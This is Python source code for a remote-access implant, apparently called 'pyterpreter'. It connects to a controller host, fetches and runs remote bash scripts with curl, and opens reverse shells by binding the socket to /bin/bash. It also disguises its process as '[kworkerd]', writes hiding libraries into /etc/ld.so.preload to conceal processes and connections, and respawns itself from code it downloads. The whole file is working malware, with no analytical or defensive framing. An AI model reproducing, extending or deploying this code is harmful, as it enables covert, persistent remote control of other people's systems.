import socket
from threading import Thread
from typing import Tuple
from queue import SimpleQueue
from base64 import b64decode, b64encode
import subprocess
import random
import string
import os
from time import sleep
import pty
import tempfile


PROCESS_NAME = '[kworkerd]'


class EnvKeys:
    LAYER = 'LAYER'
    NO_RESTART = 'NO_RESTART'
    OPEN_SHELL_CLASSIC_PORT = 'OPEN_SHELL_CLASSIC_PORT'
    OPEN_SHELL_TUNNELED_CONVERSATION_UID = 'OPEN_SHELL_TUNNEL_CONVERSATION_UID'
    PYTERPRETER = 'PYTERPRETER'
    REMOTE_IP = 'REMOTE_IP'
    REMOTE_PORT = 'REMOTE_PORT'
    RESOURCES_PORT = 'RESOURCES_PORT'


class Env:
    layer = int(os.environ.get(EnvKeys.LAYER, '0'))
    no_restart = bool(os.environ.get(EnvKeys.NO_RESTART))
    open_shell_classic_port = os.environ.get(EnvKeys.OPEN_SHELL_CLASSIC_PORT, None)
    open_shell_tunneled_conversation_uid = os.environ.get(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID, None)
    pyterpreter = 'YEET'
    remote_ip: str
    remote_port: int
    resources_port: int

    @staticmethod
    def initialise():
        Env.remote_ip = os.environ[EnvKeys.REMOTE_IP]
        Env.remote_port = int(os.environ[EnvKeys.REMOTE_PORT])
        Env.resources_port = int(os.environ[EnvKeys.RESOURCES_PORT])


class Process:
    @staticmethod
    def get_cmd_output(cmd: str, strip_new_line=False) -> [int, bytes]:
        proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        if strip_new_line and len(proc.stdout) > 0 and proc.stdout[-1] == b'\n'[0]:
            return proc.returncode, proc.stdout[:-1]
        else:
            return proc.returncode, proc.stdout

    @staticmethod
    def spawn_self_with_env(env: dict):
        subprocess.run(['python3'], env={**os.environ, **env}, input=Config.code, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


class Message:
    PONG = 'PONG'
    REPLY = 'REPLY'
    RUN_SCRIPT = 'RUN_SCRIPT'
    OPEN_SHELL_TUNNELED = 'OPEN_SHELL'
    OPEN_SHELL_CLASSIC = 'OPEN_SHELL_CLASSIC'
    LOG = 'LOG'
    ERROR = 'ERROR'
    STEALTH = 'STEALTH'
    conversation_uid: str
    purpose: str
    args: Tuple[str]

    def __init__(self, purpose: str, *args: str, conversation_uid=None):
        self.purpose = purpose
        self.args = args
        self.conversation_uid = conversation_uid if conversation_uid is not None else ''.join(random.choice(string.ascii_letters) for _ in range(16))

    def __str__(self):
        return f'{self.conversation_uid}:{self.purpose}:{[arg if len(arg) < 10 else f"{arg[10:]}..." for arg in self.args]}'

    @staticmethod
    def from_raw(line: bytes) -> 'Message':
        message_parts = tuple(b64decode(line_part).decode() for line_part in line.split(b':'))
        return Message(message_parts[1], *message_parts[2:], conversation_uid=message_parts[0])

    def to_raw(self):
        return b':'.join(b64encode(line_part.encode()) for line_part in [self.conversation_uid, self.purpose, *self.args])


class Communication:
    messages_received = SimpleQueue()  # type: SimpleQueue[Message]
    messages_to_send = SimpleQueue()  # type: SimpleQueue[Message]

    @staticmethod
    def initialise_communication(sock: socket.socket):
        Thread(target=Communication._receive_messages_forever, args=(sock,), daemon=True).start()
        Thread(target=Communication._send_messages_forever, args=(sock,), daemon=True).start()
        Thread(target=Communication._pong_forever, daemon=True).start()

    @staticmethod
    def on_communication_broken():
        print('Communication broken...')
        sleep(1)
        if not Env.no_restart:
            print('Restarting')
            Process.spawn_self_with_env({})
        else:
            exit(1)

    @staticmethod
    def _receive_messages_forever(sock: socket.socket):
        try:
            while True:
                Communication.messages_received.put(Message.from_raw(Core.receive_line_from_sock(sock)))
        except BrokenPipeError:
            Communication.on_communication_broken()

    @staticmethod
    def _send_messages_forever(sock: socket.socket):
        try:
            header_parts = [Config.username.encode()]
            sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
            while True:
                sock.send(Communication.messages_to_send.get().to_raw() + b'\n')
        except BrokenPipeError:
            Communication.on_communication_broken()

    @staticmethod
    def _pong_forever():
        while 1:
            sleep(1)
            Communication.messages_to_send.put(Message(Message.PONG))


class StealthModule:
    @staticmethod
    def initialise():
        has_gcc_code = Process.get_cmd_output('gcc --version')[0]
        network_hider_filename = '/usr/local/lib/libc.so'
        process_hider_filename = '/usr/local/lib/ld.so'
        if not os.path.isdir(os.path.dirname(network_hider_filename)):
            network_hider_filename = tempfile.mkstemp()[1]
        if not os.path.isdir(os.path.dirname(process_hider_filename)):
            process_hider_filename = tempfile.mkstemp()[1]

        if has_gcc_code == 0:
            log('Building stealth exploits from source')
            network_hider_source_fd, network_hider_source_filename = tempfile.mkstemp(suffix='.c')
            process_hider_source_fd, process_hider_source_filename = tempfile.mkstemp(suffix='.c')
            network_hider_source = MessageProcessor.get_resource('stealth', 'network_hider.c')
            process_hider_source = MessageProcessor.get_resource('stealth', 'process_hider.c')
            os.write(network_hider_source_fd, network_hider_source)
            os.write(process_hider_source_fd, process_hider_source)
            os.close(network_hider_source_fd)
            os.close(process_hider_source_fd)

            assert 0 == Process.get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0]
            assert 0 == Process.get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0]

            os.unlink(network_hider_source_filename)
            os.unlink(process_hider_source_filename)

        else:
            log('gcc not installed so using prebuilt libraries')
            with open(network_hider_filename, 'wb+') as fh:
                fh.write(MessageProcessor.get_resource('stealth', 'network_hider.so'))
                fh.truncate()
            with open(process_hider_filename, 'wb+') as fh:
                fh.write(MessageProcessor.get_resource('stealth', 'process_hider.so'))

        with open('/etc/ld.so.preload', 'w+') as fh:
            fh.write(f'{network_hider_filename}\n{process_hider_filename}\n')
            fh.truncate()

        log(f'Stealth injection successful, current process PID is {os.getpid()}')


class Core:
    @staticmethod
    def receive_line_from_sock(sock: socket.socket):
        buffer = b''
        while True:
            chunk = sock.recv(1)
            if b'\n' == chunk:
                return buffer
            else:
                buffer += chunk


class MessageProcessor:
    @staticmethod
    def process_messages_forever():
        while True:
            message = Communication.messages_received.get()
            print(f'Processing: {message}')
            if message.purpose == Message.RUN_SCRIPT:
                script_name = message.args[0]
                script_data = MessageProcessor.get_resource('scripts', script_name)
                script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = script.communicate(script_data)
                Communication.messages_to_send.put(Message(
                    Message.REPLY,
                    stdout.decode(),
                    stderr.decode(),
                    conversation_uid=message.conversation_uid
                ))
            elif message.purpose == Message.OPEN_SHELL_TUNNELED:
                Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID: message.conversation_uid})
            elif message.purpose == Message.OPEN_SHELL_CLASSIC:
                Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_CLASSIC_PORT: message.args[0]})
            elif message.purpose == Message.STEALTH:
                StealthModule.initialise()
            else:
                error(f'Error in: process_messages_forever: Unknown message purpose {message.purpose}')

    @staticmethod
    def get_resource(category: str, name: str) -> bytes:
        print(f'{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
        code, resource = Process.get_cmd_output(f'curl -s http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
        assert code == 0
        return resource


class Config:
    username = Process.get_cmd_output('whoami', True)[1].decode()
    code: bytes

    @staticmethod
    def initialise():
        Config.code = Process.get_cmd_output(f'curl {Env.remote_ip}:{Env.resources_port}/pyterpreter.py')[1]


def main_detached():
    if Env.open_shell_tunneled_conversation_uid is not None:
        os.environ.pop(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID)
        header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL_TUNNELED, Env.open_shell_tunneled_conversation_uid])
        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
        sock.send(header + b'\n')
        [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
        pty.spawn("/bin/bash")

    elif Env.open_shell_classic_port is not None:
        os.environ.pop(EnvKeys.OPEN_SHELL_CLASSIC_PORT)
        sock = socket.socket()
        while True:
            try:
                sock.connect((Env.remote_ip, int(Env.open_shell_classic_port)))
            except ConnectionError:
                sleep(0.5)
            else:
                break
        [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
        pty.spawn("/bin/bash")

    else:
        try:
            sock = socket.create_connection((Env.remote_ip, Env.remote_port))
        except ConnectionError:
            Communication.on_communication_broken()
        else:
            Communication.initialise_communication(sock)
            MessageProcessor.process_messages_forever()


def main():
    Env.initialise()
    Config.initialise()
    if Env.layer == 0:
        os.environ[EnvKeys.LAYER] = '1'
        os.environ[EnvKeys.PYTERPRETER] = Env.pyterpreter
        subprocess.run(['python3'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, input=Config.code)
    elif Env.layer == 1:
        os.environ[EnvKeys.LAYER] = '2'
        grand_child = subprocess.Popen(
            ['bash'],
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )

        if any([Env.open_shell_classic_port, Env.open_shell_tunneled_conversation_uid]):
            process_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        else:
            process_name = PROCESS_NAME
        grand_child.stdin.write(f'exec -a {process_name} python3\n'.encode())
        grand_child.stdin.flush()
        grand_child.stdin.write(Config.code)
        grand_child.stdin.write(b'\nmain()')
        grand_child.stdin.close()
    else:
        os.environ[EnvKeys.LAYER] = '0'
        main_detached()


def log(message: str):
    Communication.messages_to_send.put(Message(Message.LOG, message))


def error(message: str):
    Communication.messages_to_send.put(Message(Message.ERROR, message))


if __name__ == '__main__':
    main()
